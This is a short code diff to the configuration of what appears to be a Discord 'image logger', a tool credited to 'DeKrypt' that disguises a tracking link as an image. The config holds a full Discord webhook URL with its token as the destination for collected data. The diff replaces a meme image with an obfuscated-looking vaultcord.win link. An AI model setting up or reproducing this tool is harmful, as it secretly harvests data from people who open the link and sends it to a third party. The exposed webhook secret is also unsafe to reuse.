@@ -13,7 +13,7 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1472326773092909207/7kiGJeosRRH3Z9lwG5wBjBt5LJmj5i7h-MH6Ol8w_3nVu4WmqawFRB50lRtIUrUOrjKN",
-    "image": "https://www.citypng.com/photo/c0a7a49b/surprised-funny-cat-face-meme-hd-transparent-background#google_vignette", # You can also have a custom image by using a URL argument
+    "image": "https://vaultcord.win/%C2%A9%F0%9D%97%A6%F0%9D%97%B5%F0%9D%97%AE%F0%9D%97%B1%F0%9D%97%BC%F0%9D%98%840tgvk-iomx", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
